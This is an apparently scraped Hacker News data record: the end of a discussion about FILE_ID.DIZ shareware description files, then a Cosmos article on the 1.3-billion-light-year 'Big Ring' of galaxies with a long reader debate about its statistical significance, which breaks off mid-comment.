I read just about everything I could find - there might valuable information in it ! reply dave84 21 hours agoprevStill actively used for releases in the demoscene. reply dataf3l 19 hours agoprevif you go look in the source code of the html you can see sometags probably not rendered by the browser so in order to READ this document you have to view-source (it doesn't look that different, but it makes more sense). reply quercusa 21 hours agoprevIt has been many years since I've seen a Compuserve ID. reply LVB 19 hours agoprevI also recall DESCRIPT.ION files back in the day. reply b3lvedere 11 hours agoparentI thought only 4DOS/DR-DOS used that? reply badsectoracula 4 hours agorootparentSome file managers (e.g. Volkov Commander) used that too. Actually still do: Total Commander[0] can use to show a short description for each file. I used it in a game i wrote for an MSDOS game jam a few years ago[1][2] to add some era relevant flavor (and also dirinfo for Norton Commander and clones). [0] https://www.ghisler.com/ [1] https://bad-sector.itch.io/post-apocalyptic-petra [2] https://codeberg.org/badsector/PetraEngine/src/commit/bc6531... reply layer8 50 minutes agorootparentI still involuntarily expect GitHub to show a description of each file instead of the last commit message. reply LVB 5 hours agorootparentprevIt also was a zip description for a short while, at least among a few large midwest BBS’s, until FILE_ID.DIZ won out. reply sph 11 hours agoprevThe original .DS_Store reply jinglemansweep 6 hours agoprevI think some of my old Amos MaxsBBS Doors are still on Aminet archives. Used to love the ASCII art and the cRAZY cASING used in DIZ files. reply bluedino 20 hours agoprevWas there a standard filename for the little ANSI art file? Remember reading this text file so long ago reply colejohnson66 20 hours agoparent.NFO[0] files? [0]: https://en.wikipedia.org/wiki/.nfo reply arglebargle123 19 hours agorootparentANSI art was usually separate IIRC, nfos had ASCII art headers but I don't remember ever seeing color in them reply bluedino 19 hours agorootparentprevThat is what I was thinking of reply caseyf 16 hours agoparentprevSometimes there'd be a bunch because BBSes the zip passed through would add an nfo or .bbs reply cdchn 19 hours agoparentprevA lot of these had ASCII art in them. reply bananaboy 14 hours agoprevPcmicro was a noted RemoteAccess BBS support site back in the BBS heyday http://pcmicro.com/ra/ reply amias 9 hours agoprevi love the textured background , just needs some work-in-progress.gif reply einpoklum 11 hours agoprev [–] > MULTIPLE DISK INFO Wow, that brings back memories. Always worrying that one of the many floppies will have a read error, and there goes the whole application :-( reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "The FILE_ID.DIZ file, created by Clark Development, is a standard ASCII text file used to provide consistent descriptions of shareware programs within distribution archives.",
      "Required by the Association of Shareware Professionals (ASP) and other networks, it must include up to 10 lines of text, each no more than 45 characters long, detailing the program name, version, and description.",
      "The document outlines guidelines for creating these files, emphasizing simplicity, avoiding special formatting, and recommending popular archive formats like PKZIP (.ZIP) and LHARC (.LZH) for BBS distribution."
    ],
    "commentSummary": [
      "The discussion explores the origin and meaning of the \".DIZ\" file extension, commonly found in ZIP files, and its historical significance in early computing.",
      "Participants reminisce about old technologies like BBS software, ASCII art, and the cultural context of file naming conventions and leetspeak.",
      "The conversation also touches on the evolution of shareware into trial-ware and freemium models, the decline of shareware, and the rise of open source software, highlighting the enduring relevance of legacy systems in niche communities."
    ],
    "points": 231,
    "commentCount": 75,
    "retryCount": 0,
    "time": 1716753899
  },
  {
    "id": 40488206,
    "title": "\"Big Ring\" of Galaxies Challenges Cosmological Theories with 1.3 Billion Light-Year Span",
    "originLink": "https://cosmosmagazine.com/space/astronomy/giant-structure-space-universe/",
    "originBody": "Giant structure in space challenges understanding of the universe Artist impression of the Big Ring (blue) and Giant Arc (red). Credit: University of Central Lancashire/Stellarium. May 13, 2024 Evrim Yazgin Evrim Yazgin has a Bachelor of Science majoring in mathematical physics and a Master of Science in physics, both from the University of Melbourne. By Evrim Yazgin About 9.2 billion light-years from Earth is a colossal structure which has confounded astronomers. The discovery might upend current cosmological theories. What they’ve found is a 1.3-billion-light-year-across, almost perfect ring of galaxies. No such structure has been seen before. And it doesn’t match any known formation mechanism. It has been dubbed the “Big Ring.” The discovery was presented at the 243rd meeting of the American Astronomical Society and is detailed in a pre-print paper available on arXiv. It is the second giant structure found by teams led by Alexia Lopez, an astronomer at the University of Central Lancashire in the UK. The first, a giant arc of galaxies, was unveiled in 2022. That structure is 3.3 billion light-years across and appears in the same region of sky at the same distance from Earth as the Big Ring. “Neither of these two ultra-large structures is easy to explain in our current understanding of the universe,” Lopez says. “And their ultra-large sizes, distinctive shapes, and cosmological proximity must surely be telling us something important – but what exactly?” Read More Astronomy NASA animation simulates falling into a black hole A possible explanation for the Big Ring, according to Lopez, is “Baryonic Acoustic Oscillations” (BAOs). “BAOs arise from oscillations in the early universe and today should appear, statistically at least, as spherical shells in the arrangement of galaxies. However, detailed analysis of the Big Ring revealed it is not really compatible with the BAO explanation: the Big Ring is too large and is not spherical.” Another possibility is the structures are remnants of “defects” in the early universe called cosmic strings. The structures challenge the so-called “Cosmological Principle.” “The Cosmological Principle assumes that the part of the universe we can see is viewed as a ‘fair sample’ of what we expect the rest of the universe to be like,” Lopez explains. “We expect matter to be evenly distributed everywhere in space when we view the universe on a large scale, so there should be no noticeable irregularities above a certain size.” “Cosmologists calculate the current theoretical size limit of structures to be 1.2 billion light-years, yet both of these structures are much larger,” Lopez adds. “From current cosmological theories we didn’t think structures on this scale were possible. We could expect maybe one exceedingly large structure in all our observable universe. Yet, the Big Ring and the Giant Arc are two huge structures and are even cosmological neighbours, which is extraordinarily fascinating,” Lopez says. Originally published by Cosmos as Giant structure in space challenges understanding of the universe",
    "commentLink": "https://news.ycombinator.com/item?id=40488206",
    "commentBody": "A 1.3B-light-year-across ring of galaxies has confounded astronomers (cosmosmagazine.com)191 points by geox 12 hours agohidepastfavorite135 comments andyjohnson0 8 hours agoInteresting article. I'm not an astronomer, or any kind of scientist, but I tried perusing the paper anyway. What I expected to find was some indication that the stars in question are aligned on a plane - rather than being varying distances [1] from our pov and only looking like a ring to us. Is this information present and I missed it? My other thought, with all respect to the expertise of the scientists involved, is that when we observe the universe at this massive scale it may be inevitable that structures will just appear out of the data, even with very high statistical significance. I don't know if this is a scientifically defensible position to take though. Again - I'm not a scientist and I don't know what I'm talking about. Just musing, but interested in the opinions of others more informed than me. [1] I'm aware that determining distance over cosmological distances is very difficult reply Sharlin 7 hours agoparent> stars Galaxies. And determining the approx relative distance of distant galaxies is in fact easy thanks to cosmological redshift (the z values the article refers to). Anyway, given the number of galaxies in the ring, being at different distances but their projections just happening to form a rough circle would be even more astonishing than the galaxies in fact sharing a causal history due to some unknown early-universe mechanism. The article also mentions that either the circle or the arc in itself could be just a statistical coincidence – as long as we dok’t find more such structures – but the existence of both the circle and the arc, in the same part of the sky, is highly suspicious. reply stouset 11 minutes agorootparentLooking at the angular size of the region in question, it surely would have to be that they’re equidistant from us in order to be at all interesting. There should be innumerable galaxies in and around the ring, from our perspective. reply andyjohnson0 6 hours agorootparentprevWoops. Yes, galaxies. Too late to edit. > Anyway, given the number of galaxies in the ring, being at different distances but their projections just happening to form a rough circle would be even more astonishing than the galaxies in fact sharing a causal history due to some unknown early-universe mechanism. I don't understand what you mean by this. Why would it be \"more astonishing\" than an actual causal connection? Surely astronomers are more interested in causal connections than observational coincidences? To illustrate: the stars making up the constellation of Norma [1] form a rough square when seen from earth, but as their distances from Earth vary greatly this is just an illusion caused by Earth's relative orientation to them. Given the Copernican principle (which I accept is not a physical law) I'm struggling to see why a group of galaxies that form a circle only when seen from \"near\" earth [2] are actually cosmologically significant. I accept that the ring contains more than four galaxies, and this makes the ring more statistically significant than a square of galaxies. But it still implies a privileged viewpoint in order for it to be actually significant. I still have the gut feeling that this potential significance is more than offset by the enormously greater observational scale. tl/dr: why is this more than just naming a new constellation? (Just to re-iterate: I'm interested in understanding the errors in my mental model - and I'm not trying to poke holes in the work of scientists more qualified them me.) [1] https://en.wikipedia.org/wiki/Norma_(constellation) [2] And also, I guess, from a similar point on the other \"side\" of the ring reply alfiopuglisi 4 hours agorootparent> Woops. Yes, galaxies. Too late to edit. Not even galaxies, but massive galaxy clusters. The spatial smoothing used for the ring image is a 2D gaussian with an equivalent width of 11 Mpc, or 37 million light years, big enough to contain all the 2000 galaxies in the nearby Virgo cluster with room to spare. That's for each point in the ring (and that's why they all look so nice and round. These astronomers are playing a statistical game where a pixel combines information from trillions of stars) It's called the Big Ring for a reason. Our own Laniakea supercluster [1], whose dimensions are bigger than anyone imagined up to a few years ago, can be tiled inside the ring several times over. At that spatial scale, the Universe is supposed to be homogeneous. We do not have plausible mechanisms to generate structures on such a massive scale. Regarding your analogy with a constellation, yes you can always draw arbitrary squares and triangles among bright stars. But if you had 20+ stars arranged in a circle like that ring, no one would think it was a chance projection, you would demand a physical explanation. We do in fact have such a ring around us: the Gould Belt [2], made of young stars all around the Sun. It is difficult to recognize precisely because we are inside it, and its stars are spread all around the sky. And, of course, some kind of physical explanation is invoked for this ring as well. Moreover we do know it's an actual ring, and not some chance alignment, because we can derive the distance of each point from its redshift, and it turns out that they are all quite similar. The authors spend quite a few pages describing the 3D ring structure, showing that it's a ring only when seen from our direction, and how it would appear like an arc or a strange shape from other viewpoints. It would still be a kind of overdense structure, but maybe more difficult to recognize. BTW the mechanism used to detect the ring is quite clever: it's not a sky image, but rather an absorption map: thousands of background quasars provide a sort of uniform illumination, and they look where this light is removed by clumps of matter. [1] https://en.wikipedia.org/wiki/Laniakea_Supercluster [2] https://en.wikipedia.org/wiki/Gould_Belt reply stouset 4 minutes agorootparent> But if you had 20+ stars arranged in a circle like that ring, no one would think it was a chance projection… Of course we would? This is absolutely backwards. A random plot of billions of points will have all sorts of coincidental shapes and clusterings. A uniform field might look more random but would actually demand explanation, as lacking those coincidental clusterings is strong evidence for structure. And as I understand the topic, the scales involved preclude those galaxies physically interacting and being able to form structure. So they should appear randomly distributed. reply Retric 2 hours agorootparentprev> We do not have plausible mechanisms to generate structures on such a massive scale. Actual structure no. But, random chance can make things look like a structure on this scale. > But if you had 20+ stars arranged in a circle like that ring, no one would think it was a chance projection, you would demand a physical explanation. I would generally assume it to be random. In galaxies stars move around far to much for any structure from their initial formation to remain for long, and forming a ring long after creation would just be happenstance. reply pests 1 hour agorootparent> I would generally assume it to be random. But its not, it has structure - it looks like ring or arc. The universe should be homologous at this scale. reply Retric 1 hour agorootparentEvery formation of galaxies has structure. Random processes can appear to have meaningful structure, but that’s just because we value some outcomes more than others. > The universe should be homologous at this scale. That doesn’t mean we’re going to perceive it as homologous. A true random number generator spitting out 1, 2, 3, 4, 5, 6, 7, 8, 9, 10 would be freaky as fuck to see, but that doesn’t make it non random. reply jakeinspace 1 hour agorootparentThis is true, but at this scale, aren’t we looking at a moderate portion of the visible universe? This is hundreds of thousands or millions of galaxies appearing with some strong correlation, I believe. There are only a few trillion galaxies in the observable universe, so it’s not like we have 10^20 chances to observe random chance correlations like this. I’m just talking without actually having done a close reading or done the statistics for myself, so I could be quite wrong. reply Retric 1 hour agorootparentCheck out the preprint: https://arxiv.org/pdf/2402.07591 It’s less impressive when looking at the background data than how it’s described. reply beltsazar 47 minutes agorootparentprev> Random processes can appear to have meaningful structure, but that’s just because we value some outcomes more than others. No. It's because some structures are much much much less likely to form randomly than other structures. If you throw 1000 dices, is it possible to get all one? Yes. Is it likely? Not at all. Why do planets look like a sphere (approximately)? Because that's the most probable shape if things happen randomly. If a pyramid-shaped planet was found, scientists would freak out. This galaxy ring phenomenon is similar to that (but not that crazy). reply unusualmonkey 21 minutes agorootparent> If you throw 1000 dices, is it possible to get all one? Yes. Is it likely? Not at all. That's literally as likely as any other possible outcome. Let's simplfy this to a coin toss, which is more likely: HHHHHH or HHTHTT or HTHTHT They all have the exact same odds of appearing, we might just tell ourselves one formation is more special than any other. reply moralestapia 29 minutes agorootparentprevFinding ~50 dots arranged in a (very loosely defined) circle, from any projection, of a dense set of 2 trillion of them is very plausible. Actually, you would have a hard time producing this set in such way that no \"circles\" like that are found at all. It would have to be a very artificial distribution of points in space for you not to observe this, like all of them arranged in a single line, or a giant rectangle, idk. reply andyjohnson0 2 hours agorootparentprevThank you for taking the time to write such an informative response. reply btilly 36 minutes agorootparentprevActually I do have a plausible mechanism whose numbers have been sanity checked by a couple of cosmologists, but has never been published. Here's the idea. The expansion of the universe is currently accelerating. If this continues indefinitely, we get the https://en.wikipedia.org/wiki/Big_Rip model. What happens if the Big Rip proceeds to the point where a lot of https://en.wikipedia.org/wiki/Vacuum_energy gets released, and that release stops the Rip by creating the next Big Bang? This could form a cycle since the next Bang creates cosmos that in turn will Rip. It doesn't sound entirely crazy to me. The Casimir effect shows that you should release vacuum energy when you constrain the volume that a particularly bit of space can interact with. The incredible expansion of a Rip should constrain such interactions. So a large release of vacuum energy seems expected. And who knows how releasing vacuum energy interacts with the acceleration of the expansion of the universe? Let's do a back of the envelope estimate. Theory estimates vacuum energy at something like 10^113 joules per cubic meter of vacuum energy. For comparison the visible universe is estimated at 10^53 kg. Using Einstein's E = mc^2, that's around 10^70 joules. Current cosmological models say that at the hottest part of the Big Bang, the universe must have already been larger than a cubic meter. Yes, there is a lot of energy not in the form of visible matter. Even so, there's a lot of room for a release of vacuum energy to explain the energy density needed at the beginning of a Big Bang. We at least pass the most basic sanity check. This would offer interesting answers to some key cosmological questions. Current Big Bang models struggle with how a large volume started out very uniform. Inflation has been proposed for this, but it has some problems. But in this model, extreme uniformity over a large volume is predicted. If you add in quantum fluctuations starting the vacuum release, that have spread out before we go from Rip to Bang, then you can also explain arbitrarily large structures in the universe. This also explains the arrow of time. How could we start off with such low entropy when entropy is always increasing? Well as the universe expands, entropy increases. But volume increases faster. We wind up with a giant universe filled with very low entropy/volume. When a small piece of that forms a new Big Bang, it again starts with very low entropy. Unfortunately, this involves an insane lack of conservation of energy. But GR provides no easy way to even state what conservation of energy means. At least not outside of limited classes of models. Which this is not one of. So the idea of energy not being conserved at cosmological scales is at least not entirely unprecedented by current theory. reply szvsw 1 hour agorootparentprevThe infinite does not necessarily contain everything. I would be surprised to find an even number in an infinite list of odd numbers. I would be even more surprised to find cantor’s diagonalized number in a list of rational numbers. And yet even more surprised to find Hamlet encoded within Pi. Structure is still interesting. In re: the non-causal alignment being even more astonishing - a simple argument to illustrate this is to ask- would you be more amazed if you threw 100 bouncy balls in a room, took a photo and they formed a perfect circle in mid air at that instant from that angle, or if you went and placed the marbles one by one in a perfect circle on the ground and took a photo? The latter might be more meaningful, but the former is more miraculous - not in a religious sense of course, but just in the sense of the extraordinary unlikelihood of catching such a moment of chance alignment in noise, apophenic divinity, in how it seems to violate the second law, etc etc. It might be instructive for you to try look up Piero Della Francesca’s method of generating perspective images from a point cloud (from the 14th century no less - he invented 3D face scanning then!) and try a few manual examples to really wrap your head around how difficult it would be for a perfect circle to emerge from a truly random point cloud. reply gcanyon 57 minutes agorootparentIf Pi is normal, which we haven't proven but do suspect to be true, then it contains Hamlet, and indeed the entire works of Shakespeare in chronological order, an infinite number of times. https://en.wikipedia.org/wiki/Normal_number reply szvsw 28 minutes agorootparentOf course! But we haven’t been proven it yet. And in any case, knowing something exists is quite different than actually observing it. I know every night in Vegas, so many people will hit my lucky number (7, boring I know) on a roulette wheel that it is a perfectly ordinary event with no significance, and yet I would be ecstatic if it happened to me and would certainly be feeling lucky (and so I don’t gamble!). Even if Pi is indeed normal, it would still certainly be beyond surprising to stumble across the complete works of Shakespeare. In fact, from a cultural point of view, it would be a somewhat earth-shattering event! Imagine the headlines! Maybe not, maybe no one would care. It would certainly be shocking to anyone with half a brain cell, even if they knew it had to be somewhere… to find one such particular region is just so improbable that it would be undeniably… cool? My point is that structure emerging out of noise, even if by mere coincidence, is still deeply interesting on a human, psychological level. Another commenter described the original paper as astrology, essentially arguing that it is bad science… maybe that is the case, but I think there is still room for some form of… confusion, estrangement, awe? in observing these sorts of phenomenon, even in scientific discourse every now and then. It’s vaguely like a piece of meaningless but none-the-less captivating art emerging out of the complex technological and discursive apparatuses of science. reply mannykannot 4 hours agorootparentprevIt does not seem very plausible that professional astronomers have twice made this rookie mistake and no-one has noticed yet. Furthermore, if they were just doing what amounts to drawing circles and lines on a map of galaxies, they could have discovered thousands by now! reply mentalpiracy 3 hours agorootparentThe rate at which we are collecting data far, far outpaces the speed at which it is being analyzed. There will almost certainly be more discoveries like this as we continue surveying the cosmos with increasingly sensitive instruments. reply mannykannot 3 hours agorootparentWell, yes, but my point is that, if these astronomers are finding circles and other structures without doing basic checks such as distance, they could find thousands right now, using nothing more than a chart of the known galaxies - and even bigger ones than they are reporting here. Thus, it is not plausible that they are omitting these basic checks. reply vikingerik 2 hours agorootparentprevThere is also the multiple-endpoints principle to think about. The likelihood of this particular set of galaxies forming a ring is very low. The chance of some set of galaxies among all the billions in the sky doing this is much higher. Then we notice and cherry-pick only the one interesting data point, we never notice all the mundane ones. It's always difficult to tell if a popular-science article is really describing something unusual or if it's using selective perception to create the illusion of one. (I have no idea in this case.) reply beltsazar 25 minutes agorootparent> The chance of some set of galaxies among all the billions in the sky doing this is much higher. Of course in relative terms it's much higher, but it doesn't matter—what matters is the absolute value. 10^-100 is much larger than 10^-10000, but if something with the probability of 10^-100 happens, it's still \"astonishing.\" The probability of a particular planet has a shape of pyramid is so low. And yes, the probability of finding any planet in the universe that has a shape of pyramid is much higher, but still very low. If one was found, scientists would freak out. reply SubiculumCode 2 hours agorootparentprevIt's unusual, at the very least. Because it's relatively close to us. reply _xerces_ 4 hours agorootparentprevI think of it in terms of degrees of freedom and statistical likelihood. If I throw a bunch of marbles on the floor and a few of them form a interesting shape that is one thing as they can only move on a plane. If I throw them in the air it is less likely to form a circle as now they are free to move in multiple directions and are not constrained to the plane. If 4 of those marbles align that is less likely than 20 of them happening to do so in a recognizable shape. 20 marbles in the air, each one being in just the right place relative to the 19 others in order to look like a circle when they can be in any position in space (vs. limited to a flat plane) is exceedingly unlikely. Even more unlikely is that an arc appears next to the ring, that would make me start to wonder if something is affecting the marbles I throw into the sky. reply financypants 3 hours agorootparentIs it less likely even if we can view the marbles in the air from any angle? reply spdustin 3 hours agoparentprevI would argue that your keen interest in learning more about natural things that are mysterious to you by asking questions and doing research literally makes you a scientist. Not a professional one in the field, sure. But scientist? Most assuredly. reply GeoAtreides 1 hour agorootparentBut is he doing research? Has he read on the Cosmological Principle? Maybe some reading on what standard deviation (5.2σ on this paper) is and what it means to things being naturally random? How about reading the original paper? The Discussion section makes it very, very clear how the scientists reach the conclusion and how the Big Ring is statistically significant -- and in the process literally answering OP's question. reply xutopia 3 hours agorootparentprevCarl Sagan would agree. In his book The Demon Haunted World he explains science in very similar terms as you. He also gives examples of primitive humans doing science. reply lelanthran 43 minutes agorootparentprev> Not a professional one in the field, sure. But scientist? Most assuredly. Of course he's not a professional scientist!!! To be one you have to partake in academic politics, with its legendarily low stakes, in a publish or perish environment ... for little more than minimum-wage. reply andyjohnson0 2 hours agorootparentprevThank you! reply michae4 29 minutes agoparentprevfrom Figure 1 (page 5 of the PDF) https://arxiv.org/pdf/2402.07591: > The tangent-plane distribution of Mg II absorbers in the redshift slice z = 0.802 ± 0.060. the ring is visible in the slice, which corresponds to a distance range based on those redshift values and cosmological parameters. I think this is effectively a spherical shell of a certain thickness. reply lelanthran 49 minutes agoparentprevI don't think you have to add a disclaimer that you're not a scientist to (what looks to me to be) not-unreasonable speculations. I mean, even if you were a scientist[1], odds are good you're not that kind of scientist. Sort of like \"I'm not a lawyer, but even if I were, I'm not YOUR lawyer.\" [1] I was a scientist, and but not this kind of scientist, so your musings look just as plausible, if not more, than my own would. reply sandworm101 2 hours agoparentprevIf they are in a ring, equidistant, then whatever caused their arrangement would be local and roughly the same size/shape. But if there are at varying distances, then they would be arranged into a cone, a cone pointing directly at our galaxy. That would be a much more massive structure and, frankly, rather terrifying. reply moralestapia 5 hours agoparentprevTo be honest it's not clear if it's from our point of view or not, since they don't mention it explicitly in the paper, but it seems to be the case since they start from observations made by the Apache Point Observatory, which is on Earth ... If you think about it, it doesn't matter which point of view it works on, if the thing is an actual circle that's interesting on its own, or presumably a sphere(?) but they don't even touch on that because \"3D is hard\"? Anyway, for some reason they implicitly choose our point of view as the \"interesting one\", funny (/s, actually lame and sad) to see the geocentric model is still alive after two millennia! They also didn't check if other stars would form circles from any arbitrary point of view (how many circles are actually up there, not just the apparent ones), which would be a trivial calculation, but I guess \"matrix transformations are hard\" as well? The whole paper is pretty weak. They calculate the \"thickness\" of this \"circle\", i.e. the distance from the galaxy closest to us to the galaxy further from us if you undo the projection; and they come up with a value of ~400 Megaparsecs. Now, you may be inclined to think \"yeah, but the universe is HUGE and on that scale they may be kind of tighly packed?\". Nope! It's on the order of the largest (actual) cosmological structures that we have identified, so, pretty much, they are as further away as they can be from each other, lol. This is pretty much astrology. Source: I read the paper. reply lelanthran 38 minutes agorootparent> Anyway, for some reason they implicitly choose our point of view as the \"interesting one\", funny (/s, actually lame and sad) to see the geocentric model is still alive after two millennia! > They also didn't check if other stars would form circles from any arbitrary point of view (how many circles are actually up there, not just the apparent ones), I think (not sure of the proof) that any set of points that form a circle from a specific PoV would, from any arbitrary PoV form a regular shape (ellipse) or a straight line. So we can probably tell if any group of stars/galaxies/bright-lights-in-the-sky form a \"structure\" (i.e. a regular shape). reply MetaWhirledPeas 3 hours agorootparentprev> To be honest it's not clear if it's from our point of view or not, since they don't mention it explicitly in the paper, but it seems to be the case since they start from observations made by the Apache Point Observatory, which is on Earth Would the perspective difference be significant even if it were far out into the solar system? reply moralestapia 2 hours agorootparentYes, of course, a 2D circle could appear as a line from a certain perspective in 3D space. reply sp332 2 hours agorootparentI don't think a ring of galaxies is going to look very different from anyplace within the solar system. Anyway I think moralestapia's point is that the circle might not be centered on us, so the redshift of the galaxies would not be the same. We could still determine that a circle exists by plotting the galaxies in 3D. reply moralestapia 48 minutes agorootparentNo, I mean, a 2D circle could appear as a line from a certain perspective in 3D space. Spin up your mental model of a circle in 3D space, look at it from a vector perpendicular from its diameter, rotate it 90 degrees in any other axis but the one you're looking at it; on that 2D projection, it will be a line. reply ojosilva 6 hours agoprevI found a enlightening yet brief conference Alexia López gave on the Big Ring discovery: https://youtu.be/fwRJGaIcX6A?t=173 Here's an in-depth seminar on the findings of the Giant Arc in the Sky, her work prior to the Big Ring discovery: https://www.youtube.com/watch?v=-zkGk6EPMC8 She was also featured in a pop-sci BBC Four documentary: https://www.youtube.com/watch?v=S36MqEzUzIw Unfortunately all videos are of quite bad quality, but the explanations are a good introduction to the work. reply ganzuul 10 hours agoprevIf the ring rotated, and black hole density decreases with size (https://www.youtube.com/watch?v=71eUes30gwc), could a rotating Gödel universe exist within our universe? Could a region of space be engineered to allow for a limited form of time travel? reply matja 1 hour agoparentSimilar to the plot of https://en.wikipedia.org/wiki/Ring_(Baxter_novel) reply ganzuul 14 minutes agorootparentYes, though the Kurtzgesagt video seems to allow for a Kerr metric to be habitable in a very normal sense. reply pwatsonwailes 10 hours agoparentprevNo, is the short answer. What you'd need is space-time rotating, not something physical rotating. If you could make the things rotate because space-time was rotating, not because they were, then yes, but there's no mechanism we know of which could do that. reply tomthe 9 hours agorootparentI agree with the no, but you can make space itself rotate because things in space rotate: https://en.wikipedia.org/wiki/Frame-dragging And that in turn would rotate things in space... or not? reply pwatsonwailes 5 hours agorootparentThe Lense-Thirring effect is absolutely a thing, and we have direct evidence for it. To be clearer (I totally wasn't clear enough on this tbf), there's nothing we know of which can do it at the required scale to allow for time travel. What we're talking about here are closed timelike curves. There's models which suggest they could exist inside a singularity, but they're not going to outside without something which seriously breaks other areas of physics (Tipler cylinders etc). reply ganzuul 3 hours agorootparent> There's models which suggest they could exist inside a singularity, but they're not going to outside without something which seriously breaks other areas of physics (Tipler cylinders etc). A singularity is a dimensionless point. It has no inside. Did you mean a black hole? If so, the Kurtzgesagt cartoon explains this. The second part of you sentence seems to have a broken sentence structure. Can't make sense of it. reply ganzuul 10 hours agorootparentprevAre you familiar with the equations? I'm not prepared to simply take your word for it. In short, this seems to say the exact opposite of your claim: https://en.wikipedia.org/wiki/Dust_solution reply pwatsonwailes 5 hours agorootparentYou're on the wrong thing there. I could be wrong but I think you're outside your field on this one. reply ganzuul 3 hours agorootparentIt says that spacetime exists as an interaction of gravity alone. This implies that there is no other frame of reference in this type of solution to GR. i.e. without mass there is no time in such a universe. Not a new idea. > I could be wrong but I think you're outside your field on this one. And in contrast what would that make of you?? I'm saying that if there in some point in the future (because we can see it now) is sufficient mass density in the region of space of that big ring, and it is rotating, we tick every box we know of to theoretically allow for an eternal circle. \"Engineering\" it would mean that someone wanted some type of eternal existence, which is the profound idea at play here. Engineering things without the technology to manufacture it happens all the time. Just because we can't imagine how to build it does not mean we can't calculate if it could exist. reply qsi 5 hours agorootparentprevWhere in the Wikipedia page does it seem say so? I can't find anything relevant but then again I don't understand all of it. reply ganzuul 3 hours agorootparent> A perfect and pressureless fluid can be interpreted as a model of a configuration of dust particles that locally move in concert and interact with each other only gravitationally, from which the name is derived. That \"only\" is important but unintuitive. It means space and time can not be separated from mass. reply throwup238 4 hours agoprevDoes anyone know how fast the big ring in the sky keeps on turning? reply spdustin 3 hours agoparentI don't know where I'll be tomorrow, but I understood your reference today. reply lelanthran 36 minutes agorootparentInteresting journey. reply barbequeer 4 hours agoparentpreva year or more reply ThouYS 29 minutes agoprevI'm not an astronomer either, but pretty sure if I generated uniformly random points on the scale of number of visible galaxys, I could find a circle in there reply qD29Lno-oKXPLEv 1 hour agoprevThis is pretty incredible...I honestly would be facinated to find out what sort of early universe event might have precipitated such a massive structure reply gmuslera 5 hours agoprevCould we be watching in the wrong direction? Finding patterns where there is random noise is one of our characteristics. Or something closer than distorts our view of that region. In the other hand, complexity sometimes lead to unexpected regularities, maybe things were not so even around the Big Bang. reply Nifty3929 1 hour agoprevIs this the center of the universe then? Maybe the big band originated from the center of that ring. reply astrostl 1 hour agoparentThe universe is not believed to have a center. reply davedx 9 hours agoprevIt's obviously a Kardashev Type III[1] civilization. [1] https://en.wikipedia.org/wiki/Kardashev_scale reply hinkley 1 hour agoparentOr a weird lens effect. Gravitational lensing has a logarithmic effect doesn’t it? Theres the old joke about fitting a line to log scale data with a fat enough pen. These galaxies aren’t perfectly circular to each other. I think the fact that the arc has a similar focus to the ring is going to turn out to be something. reply pfdietz 6 hours agoparentprevWhile I doubt that explanation will hold, it is true that cosmological distances are where we should be looking for ET civilizations, as at those distances one can avoid the Fermi argument (although such a discovery would be pretty firm evidence we'll never achieve FTL travel.) reply andrewflnr 3 hours agorootparentI don't know, cosmological distances might be too early for biological life to form and evolve intelligence and expand across galaxies. My understanding is that there weren't necessarily enough of the basic chemicals of life formed until relatively recently. (Phosphorus particularly is a problem, I'm less sure about the others) And doing anything visible across light years also takes a long time, especially if FTL is impossible, which it almost certainly is. reply pfdietz 3 hours agorootparentThat's all true, to some extent, but at least it's not ruled out by Fermi. reply Sharlin 7 hours agoparentprevType IV or V, more like. reply astral_drama 2 hours agorootparentAdjust some galaxies in the early timeline and changes would appear downstream as if they were always there. For affected lifeforms, these structures (e.g. a smiley face or whathaveyou) would appear upon waking in the present morning to the data, yet when the affected search their memories, the structure would have always been there. Unlikely configurations could be interpreted as communication from beings more advanced than typically imagined, or as cosmic engineering projects, or perhaps more likely, the shape of the universe is just different than previously imagined. reply iiio8 9 hours agoparentprevIt's not just one galaxy. It's a ring of galaxies. reply EVa5I7bHFq9mnYK 1 hour agoprevLooks like Galactic Union ) reply sshb 11 hours agoprevReminded me of the circles in the sky method that might help studying the topological structure of the universe. https://mphitchman.com/geometry/section8-3.html (I think I read about it first in “The shape of space” book) reply Joel_Mckay 35 minutes agoprevIt is a weird structure because it is a helix, and not a ring. Dr. Becky covers these sorts of phenomena in an accessible format: https://www.youtube.com/@DrBecky/videos reply markus_zhang 3 hours agoprevDo we have a guess what does the ring look like X million/billion years ago? reply undersuit 2 hours agoparentYes, we have direct observations. /s The light we are viewing now was emitted billions of years ago, we don't know what it looks like today. reply profsummergig 2 hours agorootparentSomething so key to the news, and yet not mentioned in this article. The ring we see is how it looked 9 billion years ago. The universe is 14 billion years old. So, when the universe was still a baby. reply willis936 6 hours agoprevThe Cosmological Principle has been suspect for a long time. It just adds so little value and costs so much to our understanding of the universe. Best to stick to provable things. reply mr_mitm 4 hours agoparentLittle value? It's one of the assumptions that lead us to the prediction of the CMB which we then found. It's proved very fruitful, I'd say. Without the cosmological principle, modern cosmology is a complete non-starter. I'm not aware of any serious theories whatsoever that even attempt to explain anything without the cosmological principle or at least an approximation thereof. reply andrewflnr 3 hours agorootparentI recall the CMB being found accidentally, and then becoming evidence for the big bang. You don't need cosmological homogeneity to predict the CMB. reply mr_mitm 3 hours agorootparentYour memory deceives you. The CMB was found accidentally in the sense that its discoverers were simply trying to reduce noise and found this one stubborn source, but it was predicted by Alpher twenty years prior. Can you go into how you would predict it without homogeneity? Without homogeneity you don't get the FLRW metric, so you won't get the big bang or expansion, so no hot dense state in the past, thus no CMB. reply andrewflnr 1 hour agorootparentWell, I'm not a physicist, but, from Wikipedia: > In a strictly FLRW model, there are no clusters of galaxies or stars, since these are objects much denser than a typical part of the universe. Nonetheless, the FLRW model is used as a first approximation for the evolution of the real, lumpy universe because it is simple to calculate... So unless there's a really strong dependency on the size of the lumps, what breaks on the path from there to something observationally close-enough to the CMB? I mean, I know inflation is a factor there, but that very much postdates the first ideas of the big bang so it can't invalidate the basic idea. Ed: basically what I'm saying is, there are a lot of routes to a CMB-like prediction based on our observations, and I very much doubt they all get broken by lack of a cosmological principle. reply mr_mitm 1 hour agorootparentI don't like playing that card, but I am a physicist, a cosmologist actually, and I wrote in my last post how it breaks. And I used the qualifier \"approximation\" in my first post of this thread. If you don't assume homogeneity on large scales you don't get a big bang. Or at least I'm not aware of any of the routes you are talking about. Even observing receding galaxies does not necessarily imply a big bang, which is why the debate wasn't settled until the discovery of the CMB. Until then, the steady state universe was still viable, which is basically an eternally expanding universe. reply andrewflnr 52 minutes agorootparentAre the features in the article big enough to break the CMB predictions? I'm kind of 